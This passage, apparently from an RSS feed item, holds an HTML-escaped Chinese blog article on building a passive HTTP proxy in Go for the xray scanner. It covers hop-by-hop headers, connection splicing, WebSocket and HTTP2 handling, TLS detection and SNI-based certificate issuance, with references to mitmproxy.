src=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;484&quot; data-rawheight=&quot;414&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;484&quot; data-original=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-126301a78dd07bc146ada6e15d73f2e5_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;/u&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;点对点的修正&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;根据 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/draft-ietf-httpbis-p1-messaging-14%23section-7.1.3.1&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;RFC&lt;/a&gt;&lt;/u&gt;，HTTP 中的下列头被称为单跳头(Hop-By-Hop header)，这些 Header 应该只作用于单个 TCP 连接的两端，HTTP 代理在请求中如果遇到了，应当删掉这些头。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;#34;Proxy-Authenticate&amp;#34;,
&amp;#34;Proxy-Authorization&amp;#34;,
&amp;#34;Connection&amp;#34;,
&amp;#34;Keep-Alive&amp;#34;,
&amp;#34;Proxy-Connection&amp;#34;, 
&amp;#34;Te&amp;#34;,
&amp;#34;Trailer&amp;#34;,
&amp;#34;Transfer-Encoding&amp;#34;,
&amp;#34;Upgrade&amp;#34;,&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;至于这些头要删掉的原因，这里按我的理解简单说下。前两个是和认证相关的，每个代理的认证是独立的，所以认证成功应该删掉当前代理的认证信息。&lt;/p&gt;&lt;p&gt;中间的三个是用于控制连接状态的，TCP 连接是端到端的，连接状态的维护也应该是针对两端的，即客户端与代理服务器， 代理服务器与目的服务器应该是分别维护各自状态的。Proxy-Connection 类似 Connection，是用来指定客户端和代理之间的连接是不是 KeepAlive 的，代理实现时应该兼顾这个要求。对于连接的状态管理，我认为比较科学的方式是&lt;b&gt;分拆而后串联&lt;/b&gt;。分拆是说 client-&amp;gt;proxy 和 proxy -&amp;gt; server 这两个过程&lt;b&gt;分开&lt;/b&gt;处理， client-&amp;gt;proxy 的过程每次开启新的 TCP 连接，不做连接复用；而 proxy-&amp;gt;server 的过程本质上就是一个普通的 http 请求，所以可以套一个连接池，借助连接池可以复用 TCP 连接。两部分的连接都拨通后，可以将其&lt;b&gt;串联&lt;/b&gt;起来，最终效果上就是在遵循 Proxy-Connection 的前提下连接的状态最终与代理无关，而是由 client 和 server 共同控制。串联过程在 Go 中可以用两行代码简单搞定:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;go io.Copy(conn1, conn2)
io.Copy(conn2, conn1)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;TE Trailer Transfer-Encoding和请求传输的方式有关。代理在读取客户端请求时应该确保正确处理了 chunked 的传输方式后再删除这几个头，由代理自行决定在发往目的服务器时要不要使用分块传输。类似的还有 Content-Encoding，这个决定的是请求的压缩方式，也应该在代理端被科学的处理掉。好在传输方式这几个头在 Go 的标准库中都有实现，对开发者基本都是透明的，开发者可以直接使用而无需关心具体的逻辑。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Websocket 与 HTTP2&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;前面提到过 Upgrade，这里再简单说说。这个头常用于从 HTTP 转换到 Websocket 或 HTTP2 协议。对于 Websocket，被动扫描时可以不关注，所以可以直接放行。这里放行的意思是不再去解析，而是类似 Tunnel 那种，单纯的进行数据转发。对于 HTTP2 ，我们可以拒绝这一转换，使得数据协议始终用 HTTP，也算是一个偷懒的捷径。&lt;/p&gt;&lt;p&gt;当然，如果想要做的完善些，就需要套用一下这两种协议的解析，伪装成 Websocket server 或 HTTP2 server，然后做中间人去获取传输数据，有兴趣可以看一下 Python 的 MitmProxy 的实现。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;离完美的差距&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回顾刚才说的一些要点，这里的被动代理实现其实并不完美，主要有这两点:&lt;/p&gt;&lt;p&gt;第一点是隧道模式下，我们强行判定了以 0×16 开头的就是 TLS 流量，协议千千万，这种可能有误判的。其次我们认为 TLS 层下的应用协议一定是 HTTP，这也是不妥的，但对于被动扫描这种场景是足够了。&lt;/p&gt;&lt;p&gt;另一点是隧道模式下证书的签发流程不够完美。如果你用过虚拟主机，或者尝试过在同一地址同一端口上运行多个 HTTP 服务，那一定知道 nginx 中的 server_name 或是 apache 的 VirtualHost。服务器收到 HTTP 请求后会去查看请求的 Host 字段，以此决定使用哪个服务。TLS 模式下有所不同，因为 TLS 握手时服务器没法读取请求，为此 TLS 有个叫 SNI（Server Name Indication）的拓展解决了这个问题，即在 TLS 握手时发送客户端请求的域给服务器，使得在同一 ip 同一端口上运行多个 TLS 服务成为了可能。回到被动代理这，之前我们签证书用的域是从 CONNECT 的 HOST 中获取的，其实更好的办法是从 TLS 的握手中读取，这样就需要自行实现 TLS 的握手过程了，具体可以参考下 MitmProxy 的实现。 &lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//docs.mitmproxy.org/stable/concepts-howmitmproxyworks/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;docs.mitmproxy.org/stab&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;le/concepts-howmitmproxyworks/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;后话&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;零零散散说了好多，一个看似简单的 HTTP 代理实则暗藏各种玄机。在所有我见过的被动代理中，Python 的 MitmProxy 是实现的最全面最科学的，如果你想使用二而不关心其中的细节，推荐大家使用这个库。截止到这篇文章发布，在 Go 中暂时还没有类似 MitmProxy 那般完善的实现，于是我们在写 xray 被动扫描代理的时候参考了几个开源的项目并调整了一下，达到了我认为能用的状态。如果我有时间，一定要整一个Go 版的 MitmProxy! (咕咕咕&lt;/p&gt;&lt;p&gt;有一些代码层面的细节没法写到，凡事都要身体力行才能得到一些独到的理解，大家有时间可以亲自尝试下，相信会有不一样的收获。一家之谈，难免有疏漏和谬误，如果发现有问题，可以在评论处指正，或者和我微信交流下: emVtYWw2NjY=。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//tools.ietf.org/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;RFC&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//docs.mitmproxy.org/stable/concepts-howmitmproxyworks/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;How mitmproxy works&lt;/a&gt;&lt;/u&gt;&lt;br/&gt;&lt;u&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/google/martian&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/google/marti&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;an&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-09-16-82711934</guid>
<pubDate>Mon, 16 Sep 2019 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
